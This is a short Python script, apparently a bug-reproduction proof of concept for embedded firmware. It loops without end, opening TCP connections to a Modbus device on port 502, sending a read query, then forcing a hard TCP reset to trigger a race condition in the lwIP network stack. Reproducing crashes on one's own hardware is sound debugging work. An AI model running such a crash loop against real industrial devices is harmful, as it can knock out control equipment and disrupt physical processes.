import socket
import time
import struct

TARGET_IP = "192.168.0.101"  # Replace with your board's IP
TARGET_PORT = 502             # Modbus TCP port

# Standard 12-byte Modbus Read Holding Registers Query (FC3)
MODBUS_QUERY = struct.pack(">HHHBBHH", 
    0x0001, # Transaction ID
    0x0000, # Protocol ID (0 = Modbus)
    0x0006, # Length
    0x01,   # Unit ID
    0x03,   # Function Code (Read Holding Registers)
    0x0000, # Starting Address
    0x0002  # Quantity of Registers
)

def trigger_race_condition():
    print(f"[*] Starting reproduce test against {TARGET_IP}:{TARGET_PORT}...")
    iteration = 0
    
    while True:
        iteration += 1
        try:
            # 1. Open raw TCP socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.0)
            s.connect((TARGET_IP, TARGET_PORT))
            
            # 2. Send 12-byte payload
            s.sendall(MODBUS_QUERY)
            
            # 3. FORCE TCP RST (Hard Reset) instead of graceful close
            # Setting SO_LINGER to 0 causes close() to immediately issue a RST packet,
            # tearing down the PCB on lwIP's tcpip_thread while data is in flight.
            s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
            s.close()
            
            if iteration % 10 == 0:
                print(f"[+] Sent {iteration} rapid RST iterations...")

        except Exception as e:
            print(f"[!] Target stopped responding or connection failed at iter {iteration}: {e}")

        finally:
            pass

if __name__ == "__main__":
    trigger_race_condition()